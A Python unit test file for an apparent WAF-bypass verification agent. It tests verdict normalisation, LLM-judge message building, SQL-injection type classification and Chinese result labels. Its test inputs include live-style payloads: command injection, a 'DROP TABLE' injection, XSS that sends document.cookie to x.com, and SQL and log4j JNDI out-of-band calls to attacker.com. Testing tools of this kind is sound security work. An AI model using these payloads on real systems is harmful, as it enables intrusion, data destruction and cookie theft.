"""Unit tests for the verification agent's pure logic (no DB/network/LLM)."""

from __future__ import annotations

import json
import unittest

from app.verification_agent.adapters import (
    TargetEvidence,
    classify_sqli_injection_type,
    resolve_adapter,
)
from app.verification_agent.judge import (
    build_judge_user_message,
    is_unverifiable_payload,
    normalize_verdict,
    parse_verdict,
)
from app.main import _extract_json_payload, _derive_labels  # noqa: F401  (real extractor, no circular import at test time)


def _evidence(outcome: str = "application_response") -> TargetEvidence:
    return TargetEvidence(
        target_key="test-target",
        vulnerability="command-injection",
        request_summary="POST /exec ip=...",
        http_status=200,
        response_excerpt="uid=33(www-data)",
        outcome=outcome,
        evidence="ok",
    )


class NormalizeVerdictTests(unittest.TestCase):
    def test_waf_blocked_short_circuits_to_bypass_failed(self) -> None:
        verdict = normalize_verdict(None, "waf_blocked")
        self.assertEqual(verdict["bypass_verdict"], "block")
        self.assertEqual(verdict["failure_stage"], "bypass_failed")
        self.assertEqual(verdict["execution_verdict"], "not_confirmed")

    def test_request_error_short_circuits_to_check_error(self) -> None:
        verdict = normalize_verdict(None, "request_error")
        self.assertEqual(verdict["bypass_verdict"], "error")
        self.assertEqual(verdict["failure_stage"], "check_error")

    def test_unparseable_llm_falls_back_to_check_error(self) -> None:
        verdict = normalize_verdict(None, "application_response")
        self.assertEqual(verdict["failure_stage"], "check_error")
        self.assertEqual(verdict["bypass_verdict"], "block")

    def test_bypass_plus_confirmed_yields_no_failure_stage(self) -> None:
        parsed = {"bypass_verdict": "bypass", "execution_verdict": "confirmed", "confidence": 0.9}
        verdict = normalize_verdict(parsed, "application_response")
        self.assertEqual(verdict["bypass_verdict"], "bypass")
        self.assertEqual(verdict["execution_verdict"], "confirmed")
        self.assertIsNone(verdict["failure_stage"])

    def test_bypass_but_not_confirmed_yields_verify_failed(self) -> None:
        parsed = {"bypass_verdict": "bypass", "execution_verdict": "not_confirmed"}
        verdict = normalize_verdict(parsed, "application_response")
        self.assertEqual(verdict["failure_stage"], "verify_failed")

    def test_block_yields_bypass_failed(self) -> None:
        parsed = {"bypass_verdict": "block", "execution_verdict": "not_confirmed"}
        verdict = normalize_verdict(parsed, "application_response")
        self.assertEqual(verdict["failure_stage"], "bypass_failed")

    def test_execution_confirmed_outcome_overrides_llm(self) -> None:
        parsed = {"bypass_verdict": "bypass", "execution_verdict": "not_confirmed"}
        verdict = normalize_verdict(parsed, "execution_confirmed")
        self.assertEqual(verdict["execution_verdict"], "confirmed")
        self.assertIsNone(verdict["failure_stage"])

    def test_confidence_is_clamped(self) -> None:
        parsed = {"bypass_verdict": "bypass", "execution_verdict": "confirmed", "confidence": 5.0}
        verdict = normalize_verdict(parsed, "application_response")
        self.assertEqual(verdict["confidence"], 1.0)


class ParseVerdictTests(unittest.TestCase):
    def test_parse_json_object(self) -> None:
        parsed = parse_verdict('{"bypass_verdict": "bypass"}', json.loads)
        self.assertEqual(parsed["bypass_verdict"], "bypass")

    def test_parse_none_on_empty(self) -> None:
        self.assertIsNone(parse_verdict("", json.loads))

    def test_parse_none_on_non_dict(self) -> None:
        self.assertIsNone(parse_verdict("[1,2,3]", json.loads))


class BuildJudgeUserMessageTests(unittest.TestCase):
    def test_message_contains_payload_and_hints(self) -> None:
        message = build_judge_user_message(
            _evidence(), "127.0.0.1; id", "command-injection", {"classify": "application_response"}
        )
        body = json.loads(message)
        self.assertEqual(body["payload"], "127.0.0.1; id")
        self.assertEqual(body["vulnerability"], "command-injection")
        self.assertIn("deterministic_hints", body)


class SqliInjectionTypeTests(unittest.TestCase):
    def test_union(self) -> None:
        self.assertEqual(classify_sqli_injection_type("1' UNION SELECT user()--"), "union")

    def test_time(self) -> None:
        self.assertEqual(classify_sqli_injection_type("1' AND SLEEP(5)--"), "time")

    def test_boolean(self) -> None:
        self.assertEqual(classify_sqli_injection_type("1' AND 1=1--"), "boolean")

    def test_stacked(self) -> None:
        self.assertEqual(classify_sqli_injection_type("1'; DROP TABLE users--"), "stacked")

    def test_default_union(self) -> None:
        self.assertEqual(classify_sqli_injection_type("plain text"), "union")


class ResolveAdapterTests(unittest.TestCase):
    def test_resolve_known_vulnerabilities(self) -> None:
        for vuln in ("command-injection", "sql-injection", "xss", "log4j", "file-upload"):
            key, adapter = resolve_adapter(vuln)
            self.assertTrue(key)
            self.assertTrue(callable(adapter))

    def test_unknown_vulnerability_raises(self) -> None:
        with self.assertRaises(ValueError):
            resolve_adapter("rce")


class UnverifiedVerdictTests(unittest.TestCase):
    def test_unverifiable_marks_unverified_when_not_confirmed(self) -> None:
        parsed = {"bypass_verdict": "bypass", "execution_verdict": "not_confirmed"}
        verdict = normalize_verdict(parsed, "application_response", exec_unverifiable=True)
        self.assertEqual(verdict["execution_verdict"], "unverified")
        self.assertIsNone(verdict["failure_stage"])

    def test_unverifiable_but_confirmed_stays_confirmed(self) -> None:
        parsed = {"bypass_verdict": "bypass", "execution_verdict": "confirmed"}
        verdict = normalize_verdict(parsed, "execution_confirmed", exec_unverifiable=True)
        self.assertEqual(verdict["execution_verdict"], "confirmed")

    def test_verifiable_stays_not_confirmed(self) -> None:
        parsed = {"bypass_verdict": "bypass", "execution_verdict": "not_confirmed"}
        verdict = normalize_verdict(parsed, "application_response", exec_unverifiable=False)
        self.assertEqual(verdict["execution_verdict"], "not_confirmed")
        self.assertEqual(verdict["failure_stage"], "verify_failed")


class UnverifiablePayloadTests(unittest.TestCase):
    def test_sql_oob_detected(self) -> None:
        self.assertTrue(is_unverifiable_payload("1' UNION SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\x')--", "sql-injection"))
        self.assertTrue(is_unverifiable_payload("1' AND SLEEP(5)--", "sql-injection"))

    def test_xss_exfil_detected(self) -> None:
        self.assertTrue(is_unverifiable_payload("<script>fetch('http://x.com/?c='+document.cookie)</script>", "xss"))
        self.assertTrue(is_unverifiable_payload("<script>new Image().src='http://x.com/'+document.cookie</script>", "xss"))

    def test_log4j_oob_detected(self) -> None:
        self.assertTrue(is_unverifiable_payload("${jndi:ldap://attacker.com/a}", "log4j"))

    def test_file_upload_always_unverifiable(self) -> None:
        self.assertTrue(is_unverifiable_payload("<%out.println(1);%>", "file-upload"))

    def test_plain_payload_is_verifiable(self) -> None:
        self.assertFalse(is_unverifiable_payload("127.0.0.1; id", "command-injection"))
        self.assertFalse(is_unverifiable_payload("<script>alert(1)</script>", "xss"))


class DeriveLabelsTests(unittest.TestCase):
    def test_double_success_labels(self) -> None:
        verdict = {"bypass_verdict": "bypass", "execution_verdict": "confirmed"}
        labels = _derive_labels(verdict)
        self.assertIn("绕过成功", labels)
        self.assertIn("验证成功", labels)

    def test_bypass_only_labels(self) -> None:
        verdict = {"bypass_verdict": "bypass", "execution_verdict": "not_confirmed"}
        labels = _derive_labels(verdict)
        self.assertIn("绕过成功", labels)
        self.assertIn("验证失败", labels)
        self.assertNotIn("验证成功", labels)

    def test_bypass_failed_labels(self) -> None:
        verdict = {"bypass_verdict": "block", "execution_verdict": "not_confirmed"}
        labels = _derive_labels(verdict)
        self.assertIn("绕过失败", labels)

    def test_unverified_labels(self) -> None:
        verdict = {"bypass_verdict": "bypass", "execution_verdict": "unverified"}
        labels = _derive_labels(verdict)
        self.assertIn("绕过成功", labels)
        self.assertIn("未验证", labels)

    def test_error_no_bypass_label(self) -> None:
        verdict = {"bypass_verdict": "error", "execution_verdict": "not_confirmed"}
        labels = _derive_labels(verdict)
        self.assertNotIn("绕过成功", labels)
        self.assertNotIn("绕过失败", labels)
        self.assertIn("验证失败", labels)


if __name__ == "__main__":
    unittest.main()
